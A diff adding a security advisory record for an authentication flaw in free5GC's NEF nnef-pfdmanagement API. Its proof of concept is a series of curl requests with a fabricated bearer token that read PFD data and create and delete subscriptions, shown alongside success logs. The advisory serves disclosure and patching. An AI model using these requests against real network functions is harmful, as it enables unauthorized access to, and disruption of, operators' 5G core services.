@@ -1,0 +1,49 @@
+{
+  "id": "GHSA-rwww-x45w-p52w",
+  "modified": "2026-05-08T23:19:48.466896Z",
+  "published": "2026-05-08T23:02:41Z",
+  "aliases": [
+    "CVE-2026-44330"
+  ],
+  "summary": "free5GC's NEF nnef-pfdmanagement API is unauthenticated; forged bearer tokens can read PFD data and create/delete PFD subscriptions",
+  "details": "### Summary\nfree5GC's NEF mounts the `nnef-pfdmanagement` route group without inbound OAuth2/bearer-token authorization. A network attacker who can reach NEF on the SBI can use a forged or arbitrary bearer token (e.g. `Authorization: Bearer not-a-real-token`) to read PFD application data via `GET /applications` and `GET /applications/{appID}`, and to create or delete PFD change-notification subscriptions via `POST /subscriptions` and `DELETE /subscriptions/{subID}`. Same root cause as the other NEF SBI findings: the route group is mounted without any inbound auth middleware. Unlike the OAM and traffic-influence groups, `nnef-pfdmanagement` IS declared in the runtime `ServiceList`, so this is the production-intended path that operators expect to be protected by `OAuth2 setting receive from NRF: true` -- and it is not.\n\n### Details\nValidated against the NEF container in the official Docker compose lab.\n- Source repo tag: `v4.2.1`\n- Running Docker image: `free5gc/nef:v4.2.0`\n- Runtime NEF commit: `5ce35eab`\n- Docker validation date: 2026-03-11\n\nNEF advertises `OAuth2 setting receive from NRF: true`, but the entire `nnef-pfdmanagement` route group is mounted with no inbound auth middleware, so forged-token requests reach the read and subscription handlers and execute against UDR-backed state.\n\nCode evidence (paths in `free5gc/nef`):\n- Route group mounted without auth middleware: `NFs/nef/internal/sbi/server.go:56`\n- Read routes exposed at `/applications` and `/applications/:appID`: `NFs/nef/internal/sbi/api_pfdf.go:13`\n- Subscription routes exposed at `/subscriptions` and `/subscriptions/:subID`: `NFs/nef/internal/sbi/api_pfdf.go:13`\n- `GET /applications` queries UDR for application PFD data: `NFs/nef/internal/sbi/processor/pfdf.go:19`\n- `GET /applications/:appID` queries UDR for an application PFD: `NFs/nef/internal/sbi/processor/pfdf.go:53`\n- `POST /subscriptions` only checks `notifyUri` is present, then stores the subscription: `NFs/nef/internal/sbi/processor/pfdf.go:83`\n- `DELETE /subscriptions/:subID` removes the subscription: `NFs/nef/internal/sbi/processor/pfdf.go:110`\n- NEF context only exposes outbound token acquisition (`GetTokenCtx`); there is no inbound authorization path: `NFs/nef/internal/context/nef_context.go:153`\n\n### PoC\nReproduced end-to-end against the running NEF at `http://10.100.200.19:8000` using a fabricated bearer token.\n\n1. Seed an AF context (also forged-token):\n```\ncurl -i \\\n  -H 'Authorization: Bearer not-a-real-token' \\\n  -H 'Content-Type: application/json' \\\n  --data '{\"afServiceId\":\"svc-pfdf-read\",\"afAppId\":\"app-seed-pfdf-read\",\"dnn\":\"internet\",\"snssai\":{\"sst\":1,\"sd\":\"010203\"},\"anyUeInd\":true,\"trafficFilters\":[{\"flowId\":1,\"flowDescriptions\":[\"permit out ip from 192.0.2.41 to 198.51.100.0/24\"]}],\"trafficRoutes\":[{\"dnai\":\"mec-pfdf-read\",\"routeInfo\":{\"ipv4Addr\":\"10.60.0.3\",\"portNumber\":0}}]}' \\\n  http://10.100.200.19:8000/3gpp-traffic-influence/v1/af-poc-pfdf-read-20260311/subscriptions\n```\n\n2. Seed one PFD application entry (also forged-token):\n```\ncurl -i \\\n  -H 'Authorization: Bearer not-a-real-token' \\\n  -H 'Content-Type: application/json' \\\n  --data '{\"pfdDatas\":{\"app-poc-pfdf-read-20260311\":{\"externalAppId\":\"app-poc-pfdf-read-20260311\",\"pfds\":{\"pfd-poc\":{\"pfdId\":\"pfd-poc\",\"urls\":[\"^http://pfdf-read.example.com(/\\\\\\\\S*)?$\"]}}}}}' \\\n  http://10.100.200.19:8000/3gpp-pfd-management/v1/af-poc-pfdf-read-20260311/transactions\n```\n\n3. READ PFD collection with forged token -\u003e `200 OK` returns PFD data:\n```\ncurl -i -H 'Authorization: Bearer not-a-real-token' \\\n  'http://10.100.200.19:8000/nnef-pfdmanagement/v1/applications?application-ids=app-poc-pfdf-read-20260311'\n```\n\n4. READ individual PFD with forged token -\u003e `200 OK`:\n```\ncurl -i -H 'Authorization: Bearer not-a-real-token' \\\n  http://10.100.200.19:8000/nnef-pfdmanagement/v1/applications/app-poc-pfdf-read-20260311\n```\n\n5. CREATE PFD subscription with forged token -\u003e `201 Created`:\n```\ncurl -i \\\n  -H 'Authorization: Bearer not-a-real-token' \\\n  -H 'Content-Type: application/json' \\\n  --data '{\"applicationIds\":[\"app-poc-sub1\",\"app-poc-sub2\"],\"notifyUri\":\"http://127.0.0.1:65530/pfd-notify\"}' \\\n  http://10.100.200.19:8000/nnef-pfdmanagement/v1/subscriptions\n```\n\n6. DELETE PFD subscription with forged token -\u003e `204 No Content`:\n```\ncurl -i -X DELETE \\\n  -H 'Authorization: Bearer not-a-real-token' \\\n  http://10.100.200.19:8000/nnef-pfdmanagement/v1/subscriptions/1\n```\n\nNEF container logs (`docker logs nef`) show requests reaching business handlers and returning success codes:\n```\n[INFO][NEF][PFDF] GetApplicationsPFD - appIDs: [app-poc-pfdf-read-20260311]\n[INFO][NEF][GIN] | 200 | GET    | /nnef-pfdmanagement/v1/applications?application-ids=...\n[INFO][NEF][PFDF] GetIndividualApplicationPFD - appID[app-poc-pfdf-read-20260311]\n[INFO][NEF][GIN] | 200 | GET    | /nnef-pfdmanagement/v1/applications/...\n[INFO][NEF][PFDF] PostPFDSubscriptions - appIDs: [app-poc-sub1 app-poc-sub2]\n[INFO][NEF][GIN] | 201 | POST   | /nnef-pfdmanagement/v1/subscriptions\n[INFO][NEF][PFDF] DeleteIndividualPFDSubscription - subID[1]\n[INFO][NEF][GIN] | 204 | DELETE | /nnef-pfdmanagement/v1/subscriptions/1\n```\n\n### Impact\nMissing inbound authentication (CWE-306) and authorization (CWE-862) on the `nnef-pfdmanagement` SBI route group. This is the production-intended PFD service for NEF (declared in the runtime `ServiceList`), so operators expect it to be protected by NRF-issued OAuth2 -- and it is not. Any party that can reach NEF on the SBI can:\n- Read AF-supplied PFD application data anonymously, leaking traffic-classification policy (URL regex patterns, application identifiers) used downstream by SMF/UPF.\n- Create attacker-controlled PFD change-notification subscriptions pointing at attacker-chosen `notifyUri` endpoints, turning NEF into an unauthenticated outbound HTTP request source on whatever applications the attacker subscribes to.\n- Delete legitimate PFD subscriptions, denying change notifications to legitimate consumers and breaking downstream PFD-update propagation.\n\nThe defect is route-group-scoped: there is no auth middleware on the group at all, so every read and subscription endpoint inside this group inherits the missing inbound auth boundary. Severity is scored against the route group's full capability surface.\n\nAffected: free5gc v4.2.1.\n\nUpstream issue: https://github.com/free5gc/free5gc/issues/862\nUpstream fix: https://github.com/free5gc/nef/pull/23",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/free5gc/nef",
+        "purl": "pkg:golang/github.com/free5gc/nef"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "1.2.3"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-rwww-x45w-p52w/GHSA-rwww-x45w-p52w.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/free5gc/free5gc/security/advisories/GHSA-rwww-x45w-p52w"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/free5gc/free5gc/issues/862"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/free5gc/free5gc"
+    }
+  ]
+}
